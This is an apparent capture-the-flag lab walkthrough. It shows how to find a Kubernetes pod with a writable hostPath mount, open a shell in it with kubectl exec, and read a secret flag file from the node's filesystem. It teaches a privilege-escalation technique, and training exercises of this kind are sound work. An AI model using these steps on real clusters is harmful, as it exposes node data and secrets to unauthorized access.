# Airborneio 24 Challenge

The *Airborneio 24* challenge requires you to find a flag located on the Kubernetes node's file system. Without direct access to the file system and a view only Kubernetes role, you will need to find a misconfiguration in an existing resource to gain access to the flag.

## Host Path Mount Misconfiguration

Pods often need to store data on the file system as processes execute. Kubernetes supports many different volume types. The Kubernetes [hostPath](https://kubernetes.io/docs/concepts/storage/volumes/#hostpath) volume mount provides persisted storage for a pod using a directory on the host node's filesystem. Often the most simple way to gain persisted storage, the [host path mount](https://microsoft.github.io/Threat-Matrix-for-Kubernetes/techniques/Writable%20hostPath%20mount/){: target="_blank" rel="noopener"} can be a powerful attack vector for privilege escalation.

Review the pod configurations in the `hth` namespace. Which pod is using a **hostPath** mount configuration? What directory on the host node's filesystem is being mounted into the pod?

??? tip "Hint"

    - List the pods running in the `hth` namespace.

        ```bash
        kubectl get pods -n hth
        ```

        !!! abstract "Expected Output"
            ```bash
            NAME            READY   STATUS    RESTARTS   AGE
            api-randomid    1/1     Running   0          2d21h
            ui-randomid     1/1     Running   0          2d21h
            ```

    - Describe the configuration for each pod using the `kubectl describe pod` command. Search the output for the pod that has a **Volume** with a **Type** set to **HostPath**. The volume's **Path** is pointing to a directory on the node's file system that will be accessible from inside a pod running in the cluster.

        ```bash
        kubectl describe pod -n hth ENTER_POD_NAME 
        ```

        !!! abstract "Expected Output"
            ```yaml hl_lines="2-4"
            Volumes:
              hth:
                Type:          HostPath (bare host directory volume)
                Path:          ?????
                HostPathType:  DirectoryOrCreate
            ```

    - The same pod will have a **Mount** referencing the *hth* volume. The mount will specify  that specifies the directory inside the container.

        !!! abstract "Expected Output"
            ```yaml hl_lines="2"
            Mounts:
              ????? from hth (rw)
              /var/run/secrets/kubernetes.io/serviceaccount from kube-api-access-rgfww (ro)
            ```

??? success "Answer"

    - With this knowledge, you have discovered a [host path mount](https://microsoft.github.io/Threat-Matrix-for-Kubernetes/techniques/Writable%20hostPath%20mount/){: target="_blank" rel="noopener"} attack path to get from a compromised **api** pod to the node's filesystem.

        ```
        Pod: api-randomid
        Pod Mount Location: /mnt/hth/
        Host Path Location: /opt/data/hth
        ```

## Host Path Mount Privilege Escalation

Given a scenario where the pod is compromised, an attacker can use the **hostPath** volume mount to gain unauthorized access data on the Kubernetes node. Use the `kubectl exec` command to obtain a shell on the compromised pod and exfiltrate the `airborneio-24` flag from the Kubernetes node's filesystem.

??? tip "Hint"

    - Use the `kubectl exec` command to obtain a shell on the compromised pod.

        ```bash
        kubectl exec --stdin --tty -n hth ENTER_POD_NAME -- /bin/bash
        ```


        !!! abstract "Expected Output"
            ```bash
            root@api-randomid:/#
            ```

    - Once inside the pod, list the contents of the mount location.

        ```bash
        ls -l ?????
        ```

        !!! abstract "Expected Output"
            ```bash
            total 0
            drwxr-xr-x. 2 root root 68 Nov  8 23:03 api
            drwxr-xr-x. 2 root root 27 Nov  8 23:03 secrets
            ```

    - List the contents of the directory to find the `airborneio-24` flag.

        ```bash
        ls -l ?????/secrets/
        ```

        !!! abstract "Expected Output"
            ```bash
            -rw-r--r--. 1 root root 42 Nov  8 23:03 airborneio-24
            ```

    - Use the `cat` command to read the contents of the `airborneio-24` file and retrieve the flag.

    - Run the following command to exit the shell and return to your local machine.

        ```bash
        exit
        ```

??? success "Answer"

    - The `airborneio-24` flag is located in the `/mnt/hth/secrets` directory on the container's filesystem.
        
        ```bash
        cat /mnt/hth/secrets/airborneio-24
        ```

        !!! abstract "Expected Output"
            ```bash
            hth{?????}
            ```

## Next Challenge

Congratulations! You have identified a [host path mount](https://microsoft.github.io/Threat-Matrix-for-Kubernetes/techniques/Writable%20hostPath%20mount/){: target="_blank" rel="noopener"} misconfiguration and exfiltrated the **Airborneio 24** flag from the Kubernetes node's file system.

Continue to the [Shadowhawk Challenge](./shadowhawk.md) to learn how Kubernetes pod can inherit permissions from the underlying Kubernetes node.
